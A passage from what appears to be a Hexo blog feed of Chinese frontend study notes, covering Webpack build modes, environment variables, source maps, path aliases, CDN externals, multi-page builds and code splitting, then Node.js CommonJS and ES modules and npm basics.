<span class="string">&#x27;production&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>方式2：在 package.json 命令行设置 mode 参数</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;build&quot;</span>: <span class="string">&quot;webpack --mode=production&quot;</span>,</span><br><span class="line">  <span class="string">&quot;dev&quot;</span>: <span class="string">&quot;webpack serve --mode=development&quot;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：命令行设置的优先级高于配置文件中的，推荐用命令行设置</p><h2 id="打包模式的应用"><a href="#打包模式的应用" class="headerlink" title="打包模式的应用"></a>打包模式的应用</h2><p>需求：在开发模式下用 style-loader 内嵌更快，在生产模式下提取 css 代码 </p><p>方案1：webpack.config.js 配置导出函数，但是局限性大（只接受 2 种模式）</p><p>方案2：借助 cross-env （跨平台通用）包命令，设置参数区分环境 </p><p>步骤： </p><ol><li>下载 cross-env 软件包到当前项目</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i cross-env --save-dev</span><br></pre></td></tr></table></figure><ol start="2"><li>配置自定义命令，传入参数名和值（会绑定到 process.env 对象下）</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230518104016802.png" alt="image-20230518104016802.png"></p><ol start="3"><li>在 webpack.config.js 区分不同环境使用不同配置</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.css$/i</span>,</span><br><span class="line">        <span class="comment">// use: [&#x27;style-loader&#x27;, &quot;css-loader&quot;],</span></span><br><span class="line">        <span class="attr">use</span>: [process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;development&#x27;</span> ? <span class="string">&#x27;style-loader&#x27;</span> : <span class="title class_">MiniCssExtractPlugin</span>.<span class="property">loader</span>, <span class="string">&quot;css-loader&quot;</span>]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.less$/i</span>,</span><br><span class="line">        <span class="attr">use</span>: [</span><br><span class="line">          <span class="comment">// compiles Less to CSS</span></span><br><span class="line">          process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;development&#x27;</span> ? <span class="string">&#x27;style-loader&#x27;</span> : <span class="title class_">MiniCssExtractPlugin</span>.<span class="property">loader</span>,</span><br><span class="line">          <span class="string">&#x27;css-loader&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;less-loader&#x27;</span>,</span><br><span class="line">        ],</span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>方案3：配置不同的 webpack.config.js （适用多种模式差异性较大情况）</p><h1 id="Webpack-前端注入环境变量"><a href="#Webpack-前端注入环境变量" class="headerlink" title="Webpack-前端注入环境变量"></a>Webpack-前端注入环境变量</h1><p>需求：前端项目中，开发模式下打印语句生效，生产模式下打印语句失效</p><p>问题：cross-env 设置的只在 Node.js 环境生效，前端代码无法访问 process.env.NODE_ENV</p><p><a href="https://webpack.docschina.org/plugins/define-plugin">解决</a>：使用 Webpack 内置的 DefinePlugin 插件</p><p>作用：在编译时，将前端代码中匹配的变量名，替换为值或表达式</p><p>配置 webpack.config.js 中给前端注入环境变量</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">&#x27;webpack&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">new</span> webpack.<span class="title class_">DefinePlugin</span>(&#123;</span><br><span class="line">  <span class="comment">// key 是注入到打包后的前端 JS 代码中作为全局变量</span></span><br><span class="line">  <span class="comment">// value 是变量对应的值（在 corss-env 注入在 node.js 中的环境变量字符串）</span></span><br><span class="line">  <span class="string">&#x27;process.env.NODE_ENV&#x27;</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(process.<span class="property">env</span>.<span class="property">NODE_ENV</span>)</span><br><span class="line">&#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Webpack-开发环境调错-source-map"><a href="#Webpack-开发环境调错-source-map" class="headerlink" title="Webpack-开发环境调错 source map"></a>Webpack-开发环境调错 source map</h1><p><a href="https://file+.vscode-resource.vscode-cdn.net/e:/%E5%AD%A6%E4%B9%A0/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/AJAX%E6%95%99%E7%A8%8B/03.Node.js%E4%B8%8EWebpack/02-%E7%AC%94%E8%AE%B0/%5Bhttps:/webpack.docschina.org/guides/development/#using-source-maps%5D(https:/webpack.docschina.org/guides/development/)">source map</a>：可以准确追踪 error 和 warning 在原始代码的位置</p><p>问题：代码被Webpack压缩和混淆，无法正确定位源代码位置（行数和列数）</p><p><strong>设置</strong>：webpack.config.js 配置 devtool 选项</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="attr">devtool</span>: <span class="string">&#x27;inline-source-map&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>inline-source-map 选项：把源码的位置信息一起打包在 JS 文件内</p><p>注意：source map 适用于开发环境，不要在生产环境使用（防止被轻易查看源码位置）</p><h1 id="Webpack-设置解析别名路径"><a href="#Webpack-设置解析别名路径" class="headerlink" title="Webpack-设置解析别名路径"></a>Webpack-设置解析别名路径</h1><p><a href="https://file+.vscode-resource.vscode-cdn.net/e:/%E5%AD%A6%E4%B9%A0/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/AJAX%E6%95%99%E7%A8%8B/03.Node.js%E4%B8%8EWebpack/02-%E7%AC%94%E8%AE%B0/%5Bhttps:/webpack.docschina.org/configuration/resolve#resolvealias%5D(https:/webpack.docschina.org/configuration/resolve)">解析别名</a>：配置模块如何解析，创建 import 或 require 的别名，来确保模块引入变得更简单</p><p>例如：</p><ol><li>原来路径如下：</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; checkPhone, checkCode &#125; <span class="keyword">from</span> <span class="string">&#x27;../src/utils/check.js&#x27;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>配置解析别名：在 webpack.config.js 中设置</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="attr">resolve</span>: &#123;</span><br><span class="line"><span class="attr">alias</span>: &#123;</span><br><span class="line">  <span class="string">&#x27;@&#x27;</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;src&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>这样我们以后，引入目标模块写的路径就更简单了</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; checkPhone, checkCode &#125; <span class="keyword">from</span> <span class="string">&#x27;@/utils/check.js&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="优化-CDN使用"><a href="#优化-CDN使用" class="headerlink" title="优化-CDN使用"></a>优化-CDN使用</h2><p>需求：开发模式使用本地第三方库，生产模式下使用 CDN 加载引入</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/CDN">CDN定义</a>：内容分发网络，指的是一组分布在各个地区的服务器</p><p><strong>作用</strong>：把静态资源文件&#x2F;第三方库放在 CDN 网络中各个服务器中，供用户就近请求获取</p><p><strong>好处</strong>：减轻自己服务器请求压力，就近请求物理延迟低，配套缓存策略</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230518104625088.png" alt="image-20230518104625088.png"></p><p><strong>步骤</strong>：</p><ol><li>在 html 中引入第三方库的 <a href="https://www.bootcdn.cn/">CDN地址</a> 并用模板语法判断</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if(htmlWebpackPlugin.options.useCdn)&#123; %&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.2.3/css/bootstrap.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>配置 webpack.config.js 中 <a href="https://webpack.docschina.org/configuration/externals">externals</a> 外部扩展选项（防止某些 import 的包被打包）</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 生产环境下使用相关配置</span></span><br><span class="line"><span class="keyword">if</span> (process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;production&#x27;</span>) &#123;</span><br><span class="line">  <span class="comment">// 外部扩展（让 webpack 防止 import 的包被打包进来）</span></span><br><span class="line">  config.<span class="property">externals</span> = &#123;</span><br><span class="line">    <span class="comment">// key：import from 语句后面的字符串</span></span><br><span class="line">    <span class="comment">// value：留在原地的全局变量（最好和 cdn 在全局暴露的变量一致）</span></span><br><span class="line">    <span class="string">&#x27;bootstrap/dist/css/bootstrap.min.css&#x27;</span>: <span class="string">&#x27;bootstrap&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;axios&#x27;</span>: <span class="string">&#x27;axios&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">HtmlWebpackPlugin</span>(&#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      <span class="comment">// 自定义属性，在 html 模板中 &lt;%=htmlWebpackPlugin.options.useCdn%&gt; 访问使用</span></span><br><span class="line">      <span class="attr">useCdn</span>: process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;production&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Webpack-多页面打包"><a href="#Webpack-多页面打包" class="headerlink" title="Webpack 多页面打包"></a>Webpack 多页面打包</h1><p><strong>概念</strong>：</p><ul><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/SPA">单页面</a>：单个 html 文件，切换 DOM 的方式实现不同业务逻辑展示，后续 Vue&#x2F;React 会学到</p></li><li><p>多页面：多个 html 文件，切换页面实现不同业务逻辑展示</p></li></ul><p><strong>步骤</strong>：</p><ol><li>准备源码（html，css，js）放入相应位置，并改用模块化语法导出</li><li>下载 form-serialize 包并导入到核心代码中使用</li><li>配置 webpack.config.js 多入口和多页面的设置</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  <span class="attr">entry</span>: &#123;</span><br><span class="line"><span class="string">&#x27;模块名1&#x27;</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;src/入口1.js&#x27;</span>),</span><br><span class="line"><span class="string">&#x27;模块名2&#x27;</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;src/入口2.js&#x27;</span>),</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line"><span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;dist&#x27;</span>),</span><br><span class="line"><span class="attr">filename</span>: <span class="string">&#x27;./[name]/index.js&#x27;</span>  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">HtmlWebpackPlugin</span>(&#123;</span><br><span class="line">  <span class="attr">template</span>: <span class="string">&#x27;./public/页面2.html&#x27;</span>, <span class="comment">// 模板文件</span></span><br><span class="line">  <span class="attr">filename</span>: <span class="string">&#x27;./路径/index.html&#x27;</span>, <span class="comment">// 输出文件</span></span><br><span class="line">  <span class="attr">chunks</span>: [<span class="string">&#x27;模块名2&#x27;</span>]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">HtmlWebpackPlugin</span>(&#123;</span><br><span class="line">  <span class="attr">template</span>: <span class="string">&#x27;./public/页面2.html&#x27;</span>, <span class="comment">// 模板文件</span></span><br><span class="line">  <span class="attr">filename</span>: <span class="string">&#x27;./路径/index.html&#x27;</span>, <span class="comment">// 输出文件</span></span><br><span class="line">  <span class="attr">chunks</span>: [<span class="string">&#x27;模块名2&#x27;</span>]</span><br><span class="line">&#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="优化-分割公共代码"><a href="#优化-分割公共代码" class="headerlink" title="优化-分割公共代码"></a>优化-分割公共代码</h2><p><strong>步骤</strong>：</p><ol><li>配置 webpack.config.js 的 splitChunks 分割功能</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="attr">optimization</span>: &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="attr">splitChunks</span>: &#123;</span><br><span class="line">  <span class="attr">chunks</span>: <span class="string">&#x27;all&#x27;</span>, <span class="comment">// 所有模块动态非动态移入的都分割分析</span></span><br><span class="line">  <span class="attr">cacheGroups</span>: &#123; <span class="comment">// 分隔组</span></span><br><span class="line"><span class="attr">commons</span>: &#123; <span class="comment">// 抽取公共模块</span></span><br><span class="line">  <span class="attr">minSize</span>: <span class="number">0</span>, <span class="comment">// 抽取的chunk最小大小字节</span></span><br><span class="line">  <span class="attr">minChunks</span>: <span class="number">2</span>, <span class="comment">// 最小引用数</span></span><br><span class="line">  <span class="attr">reuseExistingChunk</span>: <span class="literal">true</span>, <span class="comment">// 当前 chunk 包含已从主 bundle 中拆分出的模块，则它将被重用</span></span><br><span class="line">  <span class="title function_">name</span>(<span class="params"><span class="variable language_">module</span>, chunks, cacheGroupKey</span>) &#123; <span class="comment">// 分离出模块文件名</span></span><br><span class="line"><span class="keyword">const</span> allChunksNames = chunks.<span class="title function_">map</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> item.<span class="property">name</span>).<span class="title function_">join</span>(<span class="string">&#x27;~&#x27;</span>) <span class="comment">// 模块名1~模块名2</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">`./js/<span class="subst">$&#123;allChunksNames&#125;</span>`</span> <span class="comment">// 输出到 dist 目录下位置</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> Webpack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Node.js-模块化</title>
      <link href="/2024/03/20/Node.js-%E6%A8%A1%E5%9D%97%E5%8C%96/"/>
      <url>/2024/03/20/Node.js-%E6%A8%A1%E5%9D%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="模块化简介"><a href="#模块化简介" class="headerlink" title="模块化简介"></a>模块化简介</h1><p><strong>定义</strong>：CommonJS 模块是为Node.js打包JavaScript代码的原始方式。Node.js 还支持浏览器和其他JavaScript运行时使用的ECMAScript模块标准。在Node.js中，每个文件都被视为一个单独的模块。</p><p><strong>概念</strong>：项目是由很多个模块文件组成的 </p><p><strong>好处</strong>：提高代码复用性，<strong>按需加载</strong>，<strong>独立作用域</strong> </p><p><strong>使用</strong>：需要标准语法导出和导入进行使用</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230331150407659.png" alt="image-20230331150407659.png"></p><h1 id="CommonJS标准"><a href="#CommonJS标准" class="headerlink" title="CommonJS标准"></a>CommonJS标准</h1><p>因为模块内的属性和函数都是私有的，如果对外使用，需要使用标准语法导出和导入才可以，而这个标准叫 CommonJS 标准</p><p><strong>使用</strong>： </p><ol><li>导出：<code>module.exports = &#123;&#125;</code> </li><li>导入：<code>require(&#39;模块名或路径&#39;) </code></li></ol><p><strong>模块名或路径</strong>： </p><ul><li>内置模块：直接写名字（例如：fs，path，http）</li><li>自定义模块：写模块文件路径（例如：<code>./utils.js</code>）</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自定义模块，封装求数组和的函数，并导出</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">URL</span> = <span class="string">&#x27;https://m78alien.github.io/&#x27;</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">getArraySum</span> = arr =&gt; arr.<span class="title function_">reduce</span>(<span class="function">(<span class="params">sum, val</span>) =&gt;</span> sum += val, <span class="number">0</span>)</span><br><span class="line">  </span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="variable constant_">URL</span>,</span><br><span class="line">    <span class="attr">sum</span>: getArraySum</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 导入自定义模块，使用函数</span></span><br><span class="line"><span class="keyword">const</span> obj = <span class="built_in">require</span>(<span class="string">&#x27;./nodeutil02.js&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="title function_">sum</span>([<span class="number">1</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">2</span>]));</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240320152815.png" alt="image.png"></p><h1 id="ECMAScript标准"><a href="#ECMAScript标准" class="headerlink" title="ECMAScript标准"></a>ECMAScript标准</h1><h2 id="默认导出和导入"><a href="#默认导出和导入" class="headerlink" title="默认导出和导入"></a>默认导出和导入</h2><p><strong>默认标准使用</strong>： </p><ol><li>导出：<code>export default &#123;&#125; </code></li><li>导入：<code>import 变量名 from &#39;模块名或路径&#39; </code></li></ol><p><strong>注意</strong>：Node.js 默认支持 CommonJS 标准语法 如需使用 ECMAScript 标准语法，在运行模块所在文件夹新建 package.json 文件，并设置 { <code>&quot;type&quot; : &quot;module&quot;</code> }</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240320153733.png" alt="image.png"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;module&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ECMAScript标准导出</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="variable constant_">URL</span>,</span><br><span class="line">    <span class="attr">sum</span>: getArraySum</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ECMAScript标准导入</span></span><br><span class="line"><span class="keyword">import</span> obj <span class="keyword">from</span> <span class="string">&#x27;./nodeutil02.js&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="title function_">sum</span>([<span class="number">1</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">2</span>]));</span><br></pre></td></tr></table></figure><h2 id="命名导出和导入"><a href="#命名导出和导入" class="headerlink" title="命名导出和导入"></a>命名导出和导入</h2><p><strong>命名标准使用</strong>： </p><ol><li>导出：<code>export 修饰定义语句</code> </li><li>导入：<code>import &#123; 同名变量 &#125; from &#39;模块名或路径&#39;</code></li></ol><p>如何选择： </p><ul><li><strong>按需加载</strong>，使用命名导出和导入 </li><li>全部加载，使用默认导出和导入</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 命名导出</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="variable constant_">URL</span> = <span class="string">&#x27;https://m78alien.github.io/&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">getArraySum</span> = arr =&gt; arr.<span class="title function_">reduce</span>(<span class="function">(<span class="params">sum, val</span>) =&gt;</span> sum += val, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//命名导入</span></span><br><span class="line"><span class="keyword">import</span> &#123;<span class="variable constant_">URL</span>, getArraySum&#125; <span class="keyword">from</span> <span class="string">&#x27;./nodeutil02.js&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable constant_">URL</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">getArraySum</span>([<span class="number">1</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">2</span>]));</span><br></pre></td></tr></table></figure><h1 id="包的概念"><a href="#包的概念" class="headerlink" title="包的概念"></a>包的概念</h1><p><strong>包</strong>：将模块，代码，其他资料聚合成一个文件夹 </p><p><strong>包分类</strong>： </p><ul><li>项目包：主要用于编写项目和业务逻辑</li><li>软件包：封装工具和方法进行使用</li></ul><p><strong>要求</strong>：根目录中，必须有 package.json 文件（记录包的清单信息）</p><p><strong>注意</strong>：导入软件包时，引入的默认是 index.js 模块文件 &#x2F; main 属性指定的模块文件</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230331154639881.png" alt="image-20230331154639881.png"></p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230331154702306.png" alt="image-20230331154702306.png"></p><ul><li>util文件夹是自定义的包</li><li>lib文件夹将相关代码封装</li><li>index.js是统一出口，将所以的方法都导出</li><li>package.json是记录包的信息</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.js导出所有函数方法</span></span><br><span class="line"><span class="keyword">const</span> &#123; getArraySum &#125; = <span class="built_in">require</span>(<span class="string">&#x27;./lib/arr.js&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; checkUser, checkPwd &#125; = <span class="built_in">require</span>(<span class="string">&#x27;./lib/str.js&#x27;</span>)</span><br><span class="line"><span class="comment">// 统一导出所有函数</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    getArraySum,</span><br><span class="line">    checkUser,</span><br><span class="line">    checkPwd</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 外部调用时，只需要导入包名即可</span></span><br><span class="line"><span class="keyword">const</span> obj = <span class="built_in">require</span>(<span class="string">&#x27;./utils&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj)</span><br><span class="line"><span class="keyword">const</span> result = obj.<span class="title function_">getArraySum</span>([<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>])</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result)</span><br></pre></td></tr></table></figure><h1 id="npm软件包管理器"><a href="#npm软件包管理器" class="headerlink" title="npm软件包管理器"></a>npm软件包管理器</h1><p><strong>定义</strong>： npm是Node.js标准的软件包管理器，用于下载和管理Node.js环境中的软件包</p><p><strong>使用</strong>： </p><ol><li>初始化清单文件 ：<code>npm init -y</code>（得到 <code>package.json</code> 文件，有则跳过此命令） </li><li>下载软件包 ：<code>npm i 软件包名称</code></li><li>使用软件包</li></ol><p><strong>注意</strong>：<code>-y</code> 就是所有选项用默认值，所在文件夹不要有中文&#x2F;特殊符号，建议英文和数字组成，因为 npm 包名限制建议用英文和数字或者下划线中划线</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230331155537983.png" alt="image-20230331155537983.png"></p><ol><li><code>npm init -y</code>：初始化清单文件package.json文件，如果已经定义可以跳过</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span 